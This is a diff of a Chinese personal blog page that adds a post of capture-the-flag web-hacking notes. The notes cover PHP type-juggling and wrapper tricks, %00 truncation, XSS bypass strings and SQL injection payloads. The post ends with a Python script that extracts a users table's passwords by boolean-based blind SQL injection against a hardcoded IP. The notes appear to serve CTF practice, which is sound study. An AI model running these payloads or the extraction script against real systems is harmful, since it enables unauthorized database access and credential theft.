@@ -3,16 +3,33 @@
 <head>
   <meta charset="utf-8" />
   
-  <title>Archives: 2018/7 | Another&#39;s blog</title>
+  <title>随意码的web | Another&#39;s blog</title>
   <meta name="author" content="another" />
 
+  
+  <meta name="description" content="信息收集
+.git
+.svn
+.robots.txt
+.swp vim的暂存
+压缩文件
+php
+变量覆盖
+extract()
+$$k
+trim去掉空格 除了0xf
+parse_str()解析字符串为变量
+== 类型不一定等 ===类型也要等
+sha1加密失败返回NULL
+switch没有break
+" />
   
 
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-  
+  <meta property="og:title" content="随意码的web" />
   <meta property="og:site_name" content="Another&#39;s blog" />
 
   
@@ -55,25 +72,167 @@
 </nav>
 <div class="clearfix"></div></header>
   <div id="content" class="inner">
-    <div id="main-col" class="alignleft"><div id="wrapper">
-<h2 class="archive-title">2018/7</h2>
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title">随意码的web</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>信息收集</p>
+<p>.git</p>
+<p>.svn</p>
+<p>.robots.txt</p>
+<p>.swp vim的暂存</p>
+<p>压缩文件</p>
+<p>php</p>
+<p>变量覆盖</p>
+<p>extract()</p>
+<p>$$k</p>
+<p>trim去掉空格 除了0xf</p>
+<p>parse_str()解析字符串为变量</p>
+<p>== 类型不一定等 ===类型也要等</p>
+<p>sha1加密失败返回NULL</p>
+<p>switch没有break</p>
+<p>array转换int 0或者1 </p>
+<p>0e科学计数法</p>
+<p>ox 或者0x开头字符串等于16进制</p>
+<p>%00截断</p>
+<p>两个number可以绕过后一个</p>
+<p>php伪协议</p>
+<p>a=data:text/plain,&lt;?php&gt;</p>
+<p>php://input enctype=”multipart/from-data”无效</p>
+<p>php://filter/read=string.tolower/resource=test.php</p>
+<p>include_once(“flag.php”);</p>
+<p>反序列化</p>
+<p>session反序列化 上传名字为序列化的文件</p>
+<p>hackbar</p>
+<p>xss </p>
+<p>绕过</p>
+<p>“data:text/javascript，alert(3);”</p>
+<p>us-ascii</p>
+<p>utf-7</p>
+<p>multi-byte gbl</p>
+<p>宽字节</p>
+<p>%3c%27 alert(1) //</p>
+<p>反序列化</p>
+<p>session反序列化可以先创建个文件在远程</p>
+<pre><code>                                  table_scnema
+
+column                     table_name
+
+                              column_name
+</code></pre><p>desc   information_schema  {                         schemata                   schem_name</p>
+<pre><code>tables                table_schema
+
+                        table_name     
+</code></pre><p>?id=1’ and ord(mid(‘select table_name   from information_schema.tables limit 1,1’,1,1))&gt;11%23</p>
+<p>import requests</p>
+<p>import base64</p>
+<p>import time</p>
+<p>import string</p>
+<p>print ‘a’</p>
+<p>def send(url,key1,value1):</p>
+<pre><code>value1 = base64.b64encode(value1)
 
 
-  <div class="archive">
+data = {
+
+
+    key1:value1,
+
+
+}
+
+
+response = requests.post(url,data=data)
+
+
+content = response.content
+
+
+
+
+
+if &quot;Alix&quot; in content:
+
+
+    return True
+
+
+else:
+
+
+    return False
+</code></pre><p>str = string.printable</p>
+<p>def main():</p>
+<pre><code>found = &quot;&quot;
+
+
+for i in range(1, 80):
+
+
+
+
+
+    for j in range(1, 123):
+
+
+
+
+
+
+        _username = &quot;nothing&apos; or ascii(mid((select group_concat(password) from users), %d, 1))=%d#&quot; % (i, j)
+
+
+
+
+
+
+        _password=&quot;amin&quot;
+
+
+        print _username
+
+
+        if send(&apos;http://128.199.224.175:24000/&apos;, &apos;spy_name&apos;,_username):
+
+
+            found +=chr(j)
+
+
+            print found
+
+
+            break
+</code></pre><p>main()</p>
+
+      
+    </div>
     
-      <article class="post">
-        <div class="post-content">
-          <header>
-            <div class="icon"></div>
-            
-            
-              <h1 class="title"><a href="/2018/07/07/各种脚本/">各种脚本（比赛时候懒得现写）</a></h1>
-            
-          </header>
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
-      </article>
-    
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
   </div>
+</article>
+
+
+
 </div></div>
     <aside id="sidebar" class="alignright">
   
